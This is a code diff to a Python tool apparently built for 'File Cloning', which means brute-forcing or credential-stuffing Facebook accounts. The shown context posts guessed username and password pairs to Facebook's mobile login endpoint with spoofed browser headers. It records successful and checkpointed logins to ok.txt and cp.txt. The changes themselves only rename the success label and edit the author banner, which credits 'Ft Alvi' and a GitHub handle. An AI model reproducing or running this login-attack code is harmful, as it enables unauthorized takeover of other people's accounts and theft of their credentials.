@@ -190,13 +190,13 @@ class __crack__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mALI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mFIRE-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mALI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mFIRE-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -490,13 +490,13 @@ banner = """
                                                          
                                                                                                                                             
 ╔════════════════════════════════════════╗
-║[•] Author      : Ft Alvi               ║
-║[•] Facebook    : Ft Alvi               ║ 
-║[•] Github      : github.com/ACTION-FIRE║
-║[•] Status    	 : Premium               ║
-║[•] Network     : 3G, 4G/5G, ON         ║
-║[•] Version  	 : V:2.0                 ║
-║[•] Tools    	 : File Cloning          ║
+║[•] Author     : Ft Alvi                ║      
+║[•] Facebook   : facebook.com/ft.alvi.18║ 
+║[•] Github     : github.com/ACTION-FIRE ║
+║[•] Status    	: Premium                ║
+║[•] Network    : 3G, 4G/5G, ON          ║
+║[•] Version  	: V:2.0                  ║
+║[•] Tools    	: File Cloning           ║
 ║════════════════════════════════════════║
 ║════════════════════════════════════════║
 ║              Alvi MENU [👑]            ║
